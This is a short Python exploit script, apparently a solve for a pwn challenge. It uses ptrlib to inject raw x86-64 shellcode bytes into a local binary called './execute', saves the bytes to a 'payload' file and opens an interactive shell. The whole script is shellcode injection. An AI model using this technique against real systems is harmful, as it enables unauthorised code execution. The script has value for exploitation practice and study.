#!/usr/bin/env python

import ptrlib as ptr

elf = ptr.ELF("./execute")
io = ptr.Process(elf.filepath)

# shellcode1 = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\xC7\xC7\x00\x00\x00\x00\xBA\x3C\x00\x00\x00\x48\x8D\x45\xB0\x48\x89\xC6\xE8\x00\x00\x00\x00"
shellcode1 = b"\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\x31\xDB\xBA\x3C\x00\x00\x00\x48\x8D\x5D\xB0\x48\x89\xDE\xE8\x00\x00\x00\x00\x48\x8D\x45\xB0\xFF\xD0"

io.sendline(shellcode1)

with open("./payload", "wb") as f:
    f.write(shellcode1)

io.sh()
